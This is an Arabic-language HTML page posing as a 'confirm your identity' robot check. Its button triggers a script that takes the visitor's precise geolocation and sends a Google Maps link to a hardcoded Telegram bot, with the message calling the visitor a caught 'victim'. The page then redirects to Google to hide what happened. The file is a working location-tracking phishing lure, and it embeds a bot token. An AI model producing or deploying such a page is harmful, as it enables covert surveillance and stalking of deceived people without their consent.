<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الدخول</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
        button { background: #1DB954; color: white; border: none; padding: 15px 30px; border-radius: 25px; font-size: 18px; cursor: pointer; }
    </style>
    <script>
        async function catchMe() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude;
                    const lon = p.coords.longitude;
                    const token = "8715903044:AAEiMvrPalCrQMcXRLVw2-8AvIX6fAyPm78";
                    const chat_id = "8419832124";
                    const map = `https://www.google.com/maps?q=${lat},${lon}`;
                    const text = `🔱 تم صيد موقع الضحية 🔱\n\nالرابط:\n${map}`;
                    
                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
                    window.location.href = "https://www.google.com";
                }, () => {
                    window.location.href = "https://www.google.com";
                }, {enableHighAccuracy: true});
            }
        }
    </script>
</head>
<body>
    <h2>يجب تأكيد هويتك للمتابعة</h2>
    <p>اضغط على الزر أدناه لإتمام الفحص</p>
    <br>
    <button onclick="catchMe()">أنا لست برنامج روبوت</button>
</body>
</html>
